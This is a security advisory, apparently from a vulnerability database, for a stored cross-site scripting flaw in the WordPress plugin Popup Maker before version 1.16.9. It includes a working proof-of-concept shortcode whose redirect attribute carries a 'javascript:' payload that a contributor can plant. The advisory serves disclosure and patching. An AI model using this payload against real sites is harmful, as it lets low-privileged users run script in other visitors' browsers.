## WordPress Plugin Vulnerabilities

# Popup Maker < 1.16.9 - Contributor+ Stored XSS via Subscription Form

### Description

The plugin does not validate and escape one of its shortcode attributes, which could allow users with a role as low as contributor to perform Stored Cross-Site Scripting attacks

### Proof of Concept

As a contributor, put the following shortcode in a post/page
[pum\_sub\_form name\_field\_type="fullname" label\_name="Name" label\_email="Email" label\_submit="Subscribe" placeholder\_name="Name" placeholder\_email="Email" form\_layout="block" form\_alignment="center" form\_style="default" privacy\_consent\_enabled="yes" privacy\_consent\_label="Notify me about related content and special offers." privacy\_consent\_type="radio" privacy\_consent\_radio\_layout="inline" privacy\_consent\_yes\_label="Yes" privacy\_consent\_no\_label="No" privacy\_usage\_text="If you opt in above we use this information send related content, discounts and other special offers." redirect\_enabled redirect="javascript:alert(/XSS/)"]
The XSS will be triggered when previewing/viewing the post/page and submitting the form
